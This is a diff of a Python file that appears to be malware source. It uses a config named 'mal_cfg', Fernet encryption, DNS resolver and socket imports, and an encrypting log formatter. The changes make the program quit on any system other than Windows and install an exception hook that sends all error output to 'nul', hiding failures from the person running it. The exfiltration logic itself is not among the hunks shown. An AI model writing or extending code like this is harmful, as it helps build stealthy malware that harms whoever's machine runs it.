@@ -1,25 +1,36 @@
 # -*- coding: utf-8 -*-
 
 from __future__ import print_function
+import platform, sys
 
+if platform.system() != 'Windows':
+    sys.exit(1)
+
+
+def exhook(exception_type, exception, traceback):
+    with open('nul', 'w') as nul:
+        print('{0}: {1}'.format(exception_type.__name__, exception), file=nul)
+
+
+sys.excepthook = exhook
 try:
     import ConfigParser as configparser
 except ImportError:
     import configparser
 
-import base64
 from builtins import bytes
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
+from io import StringIO
+
+import base64
 import dns.exception
 import dns.resolver
-from io import StringIO
 import logging
 import logging.handlers
 import random
 import socket
-import sys
 import time
 
 cfg = u"""
@@ -70,11 +81,11 @@ mal_cfg = cfg_factory(cfg)
 
 class CryptoFormatter(logging.Formatter):
 
-    fmt = '%(asctime)s %(message)s'
+    minimal = '%(asctime)s %(message)s'
     converter = time.gmtime
-    datefmt = '%Y-%m-%d %H:%M:%S'
+    gmtdate = '%Y-%m-%d %H:%M:%S'
 
-    def __init__(self, fmt=fmt, datefmt=datefmt):
+    def __init__(self, fmt=minimal, datefmt=gmtdate):
         super(CryptoFormatter, self).__init__(fmt, datefmt)
         self.aes = aes_factory(mal_cfg)
 
